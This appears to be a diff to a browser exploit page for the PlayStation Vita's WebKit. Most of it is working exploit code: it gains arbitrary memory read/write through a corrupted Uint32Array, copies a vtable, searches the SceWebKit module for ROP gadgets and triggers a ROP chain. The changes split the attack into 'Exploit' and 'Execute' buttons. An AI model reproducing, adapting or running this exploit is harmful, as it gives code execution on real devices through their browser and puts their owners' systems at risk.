@@ -5,6 +5,10 @@
 
 // global vars
 var _gc, _cnt = 0;
+var u32;
+var u32addr;
+var u32base;
+//var webkit;
 
 function tryExpl_vita(att)
 {
@@ -13,7 +17,7 @@ function tryExpl_vita(att)
     // Part 1: getting the Uint32Array object address
     //
 	    // init vars  	    
-	    var u32 = new Uint32Array(8);
+	    u32 = new Uint32Array(8);
 	    var a1 = [0,1,2,3,u32];	       
 	    var a2 = [0,1,2,3,4]; // right after a1
 	    var a1len = a1.length;
@@ -135,27 +139,58 @@ function tryExpl_vita(att)
 		logAdd("u32.length = 0x" + u32.length.toString(16));
 		if (u32.length == u32len) { logAdd("error: 3"); return 3; }
 		//logAdd("u32[] data:<br/>" + ArrayToString(u32,0,16)); // for RnD
-		
-	//
-	//  Part 4: copying vtable
-	//
 			
 		// find out the memory address of u32[0] (ArrayBufferView.m_baseAddress)
-		var u32base = u32[0x40000000-2];
+		u32base = u32[0x40000000-2];
 		logAdd("u32 address = 0x" + u32addr.toString(16));
 		logAdd("u32 base = 0x" + u32base.toString(16));
-			
-		// declare aux functions 				
-		var getU32 = function(addr) { 
-			return u32[(addr - u32base) >>> 2]; 	
-		}
-		var setU32 = function(addr,val) { 
-			return u32[(addr - u32base) >>> 2] = val; 	
-		}
+	}
+	catch(e) {
+	    logAdd("Error: " + e);
+	}
+	
+	return 0;
+}
 
-        var getU8 = function(addr) {
-            return (getU32((addr)& ~0x3) >>> (((addr)%4) * 8)) & 0xFF;
-        }
+// declare aux functions 
+function getU32(addr) { 
+	return u32[(addr - u32base) >>> 2];
+}
+function setU32(addr,val) { 
+	return u32[(addr - u32base) >>> 2] = val;
+}
+
+function getU8(addr) {
+	return (getU32((addr)& ~0x3) >>> (((addr)%4) * 8)) & 0xFF;
+}
+
+// "Exploit" button onclick handler
+function exploit()
+{
+	try {   
+	    logAdd("======== Start ========");
+		
+		tryExpl_vita(1);
+		
+		logAdd("<br/>========&nbsp;End &nbsp;========<br/><br/>");	
+		
+		document.getElementsByName("exec")[0].disabled = false;
+	}
+	catch(e) {
+	    logAdd(e);
+	}
+	_log = null;
+}
+
+// "Execute" button onclick handler
+function exec()
+{
+	try {   
+	    logAdd("======== Start ========");
+		
+	//
+	//  Copying vtable
+	//
         
 		var vtable = getU32(u32addr);
 		
@@ -169,7 +204,6 @@ function tryExpl_vita(att)
 		
         // load the function address in scewebkit
         var webkit = u32[0x48/4];
-        var match = 0;
         
         while (++webkit % 0x8);
         
@@ -186,6 +220,7 @@ function tryExpl_vita(att)
                 (String.fromCharCode(getU8(i+8)) == 't'))
             {
                 webkit = i;
+                //logAdd("webkit address = 0x" + webkit.toString(16));
                 break;
             }
         }
@@ -193,8 +228,6 @@ function tryExpl_vita(att)
         var gadget1 = 0;
         var gadget2 = 0;
         var gadget3 = 0;
-        
-        alert("Press OK, the process may take a few minutes. Found webkit at:" + webkit.toString(16));
         
         for (var i = webkit; ; i-=2)
         {
@@ -277,21 +310,6 @@ function tryExpl_vita(att)
 		
 		// BEGIN ROP AND ROLL
 		u32.toString(0xDEADBEEF, 0xDEADBEEF, 0xDEADBEEF);
-	}
-	catch(e) {
-	    logAdd("Error: " + e);
-	}
-	
-	return 0;
-}
-
-// "Start" button onclick handler
-function btnClick()
-{
-	try {   
-	    logAdd("======== Start ========");
-		
-		tryExpl_vita(1);
 		
 		logAdd("<br/>========&nbsp;End &nbsp;========<br/><br/>");	
 	}
@@ -306,8 +324,11 @@ writeEnvInfo();
 
 </script>
 
-<button style="width:100px;" onclick="btnClick();">Start</button>
-<br/><br/>
+<button style="width:100px;" onclick="exploit();">Exploit</button>
+<br>
+<button name="exec" style="width:100px;" onclick="exec();" disabled>Execute</button>
+<br>Execution may take a few minutes.</br>
+<br><br>
 <div id="log"></div>
 </body>
 </html>
